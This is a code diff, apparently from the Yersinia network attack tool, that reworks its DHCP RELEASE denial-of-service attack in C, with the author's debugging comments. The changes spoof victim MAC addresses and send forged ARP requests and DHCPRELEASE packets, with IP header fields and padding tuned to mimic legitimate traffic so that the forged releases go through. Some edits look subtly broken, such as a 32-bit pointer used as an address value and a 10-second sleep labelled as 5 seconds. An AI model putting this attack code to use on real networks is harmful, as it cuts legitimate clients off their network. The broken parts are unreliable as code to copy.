@@ -460,9 +460,14 @@ dhcp_send_release(struct attacks *attacks, u_int32_t server, u_int32_t ip, u_int
 { // This bit is called when it's time to actually send the release packet, thus it also might be the cause of the packets not being sent 
     struct dhcp_data *dhcp_data;
 
+    u_int8_t mac_before_spoof[ETHER_ADDR_LEN];
+
     dhcp_data = attacks->data;
 
-    memcpy((void *)dhcp_data->mac_source, (void *)mac_victim, ETHER_ADDR_LEN);
+    //mac_before_spoof = dhcp_data->mac_source;
+    memcpy((void *)mac_before_spoof,(void *)dhcp_data->mac_source,ETHER_ADDR_LEN);
+
+    memcpy((void *)dhcp_data->mac_source, (void *)mac_victim, ETHER_ADDR_LEN); //as this is never reverted, the false MAC stays for next requests
     memcpy((void *)dhcp_data->mac_dest, (void *)mac_server, ETHER_ADDR_LEN);
     
     dhcp_data->sport = DHCP_CLIENT_PORT;
@@ -473,24 +478,39 @@ dhcp_send_release(struct attacks *attacks, u_int32_t server, u_int32_t ip, u_int
 
     dhcp_data->op = LIBNET_DHCP_REQUEST;
     dhcp_data->flags = 0;
-    /* FIXME: libnet consistency */
+    /* FIXME: libnet consistency */ // !? HUH
     dhcp_data->ciaddr = htonl(ip);
 
 /*    memcpy((void *)&dhcp_data->ciaddr, (void *)&ip, 4);*/
 
     memcpy((void *)dhcp_data->chaddr, (void *)mac_victim, ETHER_ADDR_LEN);
-
+    //I have no clue why it starts at [2] and google is not very helpful to me rn
     dhcp_data->options[2] = LIBNET_DHCP_MSGRELEASE;
     dhcp_data->options[3] = LIBNET_DHCP_SERVIDENT;
     dhcp_data->options[4] = 4;
     /* server identification = destination ip */
     memcpy((void *) &dhcp_data->options[5], (void *) &dhcp_data->dip, sizeof(u_int32_t));
     dhcp_data->options[9] = LIBNET_DHCP_END;
+    for (int i = 10; i < 45; i++)
+    {
+        dhcp_data->options[i] = LIBNET_DHCP_PAD;
+        // in reality I doubt that padding plays any role in the attack being broken
+        // however imitating a legitimate packet (captured one contained this amoun of padding) is the best lead right now
+    }
+    dhcp_data->options_len = 54;
 
-    dhcp_data->options_len = 10;
+    // Code above is pretty much moving data from one place to another and not really doing much with it, it's all a setup for the dhcp_send_packet
+    // Let's add some error handling in here, the same way it is implemented in dhcp_send_packet
+    if (dhcp_send_packet(attacks) < 0)
+    {
+        //dhcp_data->mac_source = mac_before_spoof;
+        memcpy((void *)dhcp_data->mac_source,(void *)mac_before_spoof,ETHER_ADDR_LEN);
+        write_log(1,"Error in dhcp_send_packet\n");
+        return -1;
+    }
 
-    dhcp_send_packet(attacks);
-
+    //dhcp_data->mac_source = mac_before_spoof;
+    memcpy((void *)dhcp_data->mac_source,(void *)mac_before_spoof,ETHER_ADDR_LEN);
     return 0;
 }
 
@@ -815,6 +835,31 @@ void dhcp_th_rogue_server_exit( struct attacks *attacks )
     pthread_exit(NULL);
 }
 
+
+
+u_int32_t flip_ip(u_int32_t ip) 
+/* in DHCP release DOS, IP addresses appeared to be flipped in the pcaps
+ for example as 1.1.168.192 instead of 129.168.1.1 
+ this function is called to use bitwise magic to flip them back in order
+*/
+{
+    u_int32_t leftmost,leftmiddle,rightmiddle,rightmost,flipped;
+    
+    // do some binary manipulation of the value to flip the things around
+    leftmost = (ip & 0x000000FF) >> 0;
+    leftmiddle = (ip & 0x0000FF00) >> 8;
+    rightmiddle = (ip & 0x00FF0000) >> 16;
+    rightmost = (ip & 0xFF000000) >> 24;
+
+    leftmost  <<= 24;
+    leftmiddle <<= 16;
+    rightmiddle <<= 8;
+    rightmost <<= 0;
+
+    flipped = (leftmost | leftmiddle | rightmiddle | rightmost);
+    return flipped;
+}
+
 /**********************************/
 /* DoS attack sending DHCPRELEASE */
 /**********************************/
@@ -845,49 +890,51 @@ void dhcp_th_dos_send_release( void *arg )
 
     memcpy((void *)&aux_long, (void *)param[DHCP_DOS_SEND_RELEASE_START_IP].value, 4);
     memcpy((void *)&aux_long1, (void *)param[DHCP_DOS_SEND_RELEASE_SERVER].value, 4);
+    
+    aux_long = flip_ip(aux_long);
+    aux_long1 = flip_ip(aux_long1);
 
     if (dhcp_send_arp_request(attacks, aux_long1) < 0)
     /* build and send an ARP request, write an error to the log and quit if returns -1
     This error can happen if we can't build the ARP header / can't build the Ethernet header / there is a write error in libnet */
     {
-        write_log(0, "Error in dhcp_send_arp_request\n");
+        write_log(1, "Error in dhcp_send_arp_request\n");
         dhcp_th_dos_send_release_exit(attacks);
     }
 
     /* MAC from the Server - wait for a packet and try to learn the MAC address of the server
     Quit if returned -1. This error will occur if there's errors with allocating memory or the address is not learned by the end of waiting time*/
+    //NOTE - The attack used to fail in this spot, however it has been resolved and now teh attack fails further on, however on the same function
     if (dhcp_learn_mac(attacks, aux_long1, arp_server) < 0)
     {
-        write_log(0, "Error in dhcp_learn_mac for the server\n");
+        write_log(1, "Error in dhcp_learn_mac for the server\n");
         dhcp_th_dos_send_release_exit(attacks);
     }
-
+    thread_usleep(10000000); // sleep for 5 seconds to see if there's arp throttling
     /* loop */
     /* I believe the condition in english is "while current IP is lesser than the value of the last IP and while the attack is not stopped" */
+    // If with this setup, the attack successfuly learns the server MAC and the MAC #1 and still fails on #2, then a delay between ARP requests should be implemented
     while ((aux_long <= (*(u_int32_t *)param[DHCP_DOS_SEND_RELEASE_END_IP].value)) 
               && !attacks->attack_th.stop) 
     {
 
         if (dhcp_send_arp_request(attacks, aux_long) < 0)
         {
-            write_log(0, "Error in dhcp_send_arp_request\n");
+            write_log(1, "Error in dhcp_send_arp_request\n");
             dhcp_th_dos_send_release_exit(attacks);
         }
 
         /* MAC from the victim */
         if (dhcp_learn_mac(attacks, aux_long, arp_mac) < 0)
         {
-            write_log(0, "Error in dhcp_learn_mac\n");
+            // NOTE - Right now the attack dies right here, as the packet seems to be the exact same as the server one (which gets a reply successfully), just with a different address, arp requests might be throttled by the router?
+            write_log(1, "Error in dhcp_learn_mac\n");
             /*dhcp_dos_send_release_exit(attacks);*/
         } else
         if (dhcp_send_release(attacks, aux_long1, aux_long, arp_server, arp_mac) < 0)
         {
-            write_log(0, "Error in dhcp_send_release\n");
-            /*If I had to make an educated guess, this next line might be causing trouble
-              As It will quit the entire thread on an error in the dhcp_send_release
-              And all of the addresses that are after it in the loop will not get the chance to run
-              If the error occurs on the first IP, then others won't be attempted, I feel like this might be the cause
-              But I am yet to test it. In theory other threads should still work and send stuff*/
+            write_log(1, "Error in dhcp_send_release\n");
+            
             dhcp_th_dos_send_release_exit(attacks);
         }
 
@@ -913,27 +960,34 @@ void dhcp_th_dos_send_release_exit( struct attacks *attacks )
 
 
 int8_t
-dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest)
+dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest) // possible that this one is broken, in a way that it creates valid, but malformed requests
 {
     libnet_ptag_t t;
     libnet_t *lhandler;
     int32_t sent;
     struct dhcp_data *dhcp_data;
-    char *mac_dest = "\xff\xff\xff\xff\xff\xff";
+    struct attack_param * param = NULL;
+    char *mac_dest = "\xff\xff\xff\xff\xff\xff"; //send to broadcast
     char *mac_source = "\x00\x00\x00\x00\x00\x00";
 /*    int8_t *ip_source="\x00\x00\x00\x00";*/
-    u_int32_t aux_long;
+    u_int32_t *aux_long; // I feel like this should be a pointer? might be wrong, but it's worth a try
    dlist_t *p;
    struct interface_data *iface_data;
 
     dhcp_data = attacks->data;
-
+    param = attacks->params;
+    
+    
+    
+    
    for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p))
     {
       iface_data = (struct interface_data *) dlist_data(p);
       lhandler = iface_data->libnet_handler;
+        //aux_long = inet_addr(iface_data->ipaddr); //I think this line right here is what is broken. It is supposed to provide the IP address of the sender, however the packets in the wireshark capture say that ARP reply hsould go to 255.255.255.255
+        memcpy((void *)&aux_long, (void *)param[DHCP_DOS_SEND_RELEASE_CLIENT_IP].value, 4); // I have no clue what I'm doing, I saw this in other part of the script and hope it works lmao
+        aux_long = flip_ip(aux_long);
 
-        aux_long = inet_addr(iface_data->ipaddr);
         t = libnet_build_arp(
                     ARPHRD_ETHER, /* hardware addr */
                     ETHERTYPE_IP, /* protocol addr */
@@ -952,6 +1006,7 @@ dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest)
         if (t == -1)
         {
             thread_libnet_error("Can't build arp header",lhandler);
+            write_log(1,"Can't build arp header!");
             libnet_clear_packet(lhandler);
             return -1;
         }
@@ -972,6 +1027,7 @@ dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest)
         if (t == -1)
         {
             thread_libnet_error("Can't build ethernet header",lhandler);
+            write_log(1,"Can't build ethernet header!");
             libnet_clear_packet(lhandler);
             return -1;
         }
@@ -983,6 +1039,7 @@ dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest)
 
         if (sent == -1) {
             thread_libnet_error("libnet_write error", lhandler);
+            write_log(1,"Libnet write erre!");
             libnet_clear_packet(lhandler);
             return -1;
         }
@@ -995,8 +1052,9 @@ dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest)
 
 
 int8_t
-dhcp_learn_mac(struct attacks *attacks, u_int32_t ip_dest, u_int8_t *arp_mac)
-{
+dhcp_learn_mac(struct attacks *attacks, u_int32_t ip_dest, u_int8_t *arp_mac) //This function is most likely why the DHCP Release DOS does not work
+
+{//another possibility is that it's fine, but timing out because the previous one is busted
     struct dhcp_data *dhcp_data;
     struct libnet_ethernet_hdr *ether;
     int8_t gotit=0;
@@ -1024,15 +1082,16 @@ dhcp_learn_mac(struct attacks *attacks, u_int32_t ip_dest, u_int8_t *arp_mac)
                  
     /* Ok, we are waiting for an ARP packet for 5 seconds, and we'll wait
      * forever (50 ARP packets) for the real packet... */
-    while ( !attacks->attack_th.stop && !gotit & ( rec_packets < 50 ) )
+    while ( !attacks->attack_th.stop && !gotit & ( rec_packets < 500 ) ) //Note: I increased the wait time 10x, to see if it would still time out
     {
         rec_packets++;
 
-        thread_usleep(800000);
-
+        thread_usleep(800000); //have the thread sleep for 0,8 seconds
+        
         if ( interfaces_get_packet( attacks->used_ints, NULL, &attacks->attack_th.stop, p_data.header, p_data.packet, PROTO_ARP, 5 ) == NULL ) 
         {
-            write_log(0, "Timeout waiting for an ARP Reply...\n");
+            //Here is the exact moment that the DHCP release DoS fails. If other atacks can make use of this func normally, then it means that ir's an issue with data sent?
+            write_log(1, "Timeout waiting for an ARP Reply...\n");
             break;
         }
 
@@ -1054,7 +1113,7 @@ dhcp_learn_mac(struct attacks *attacks, u_int32_t ip_dest, u_int8_t *arp_mac)
 
             memcpy( (void *)arp_mac, (void *)ether->ether_shost, 6 );
 
-            write_log(0, " ARP Pillada MAC = %02X:%02X:%02X:%02X:%02X:%02X\n", ether->ether_shost[0], ether->ether_shost[1], ether->ether_shost[2],
+            write_log(1, " ARP Pillada MAC = %02X:%02X:%02X:%02X:%02X:%02X\n", ether->ether_shost[0], ether->ether_shost[1], ether->ether_shost[2],
                                                                                ether->ether_shost[3], ether->ether_shost[4], ether->ether_shost[5]);
              
             gotit = 1;
@@ -1111,9 +1170,10 @@ dhcp_send_packet(struct attacks *attacks)
                 lhandler,                               /* libnet handle */
                 0);                                     /* libnet id */
 
-            if (t == -1) 
+            if (t == -1) // I don't know if thread_libnet_error's also pop up in the main log, so it shouldn't hurt to add regular ones too
             {
                 thread_libnet_error( "Can't build dhcp packet",lhandler);
+                write_log(1,"Can't build dhcp packet");
                 libnet_clear_packet(lhandler);
                 return -1;
             }  
@@ -1132,6 +1192,7 @@ dhcp_send_packet(struct attacks *attacks)
             if (t == -1) 
             {
                 thread_libnet_error( "Can't build udp datagram",lhandler);
+                write_log(1,"Can't build udp datagram");
                 libnet_clear_packet(lhandler);
                 return -1;
             }  
@@ -1139,10 +1200,10 @@ dhcp_send_packet(struct attacks *attacks)
             t = libnet_build_ipv4(
                 LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DHCPV4_H
                 + dhcp_data->options_len,                       /* length */
-                0x10,                                           /* TOS */
-                0,                                              /* IP ID */
-                0,                                              /* IP Frag */
-                16,                                             /* TTL */
+                0x00,                                           /* TOS */ //changed from 0x10 to 0x00 to match legit packet
+                0x5ab6,                                         /* IP ID */ //changed to a random value to match legit packet's inclusion
+                IP_DF,                                          /* IP Frag */ //changed from 0 to don't fragment to match legit packet
+                64,                                             /* TTL */ //changed from 16 to 64 to match legit packet
                 IPPROTO_UDP,                                    /* protocol */
                 0,                                              /* checksum */
                 dhcp_data->sip,                                 /* src ip */
@@ -1155,6 +1216,7 @@ dhcp_send_packet(struct attacks *attacks)
             if (t == -1) 
             {
                 thread_libnet_error("Can't build ipv4 packet",lhandler);
+                write_log(1,"Can't build ipv4 packet");
                 libnet_clear_packet(lhandler);
                 return -1;
             }  
@@ -1172,6 +1234,7 @@ dhcp_send_packet(struct attacks *attacks)
             if (t == -1)
             {
                 thread_libnet_error("Can't build ethernet header",lhandler);
+                write_log(1,"Can't build ethernet header");
                 libnet_clear_packet(lhandler);
                 return -1;
             }
@@ -1183,6 +1246,7 @@ dhcp_send_packet(struct attacks *attacks)
 
             if (sent == -1) {
                 thread_libnet_error("libnet_write error", lhandler);
+                write_log(1,"libnet_write error");
                 libnet_clear_packet(lhandler);
                 return -1;
             }
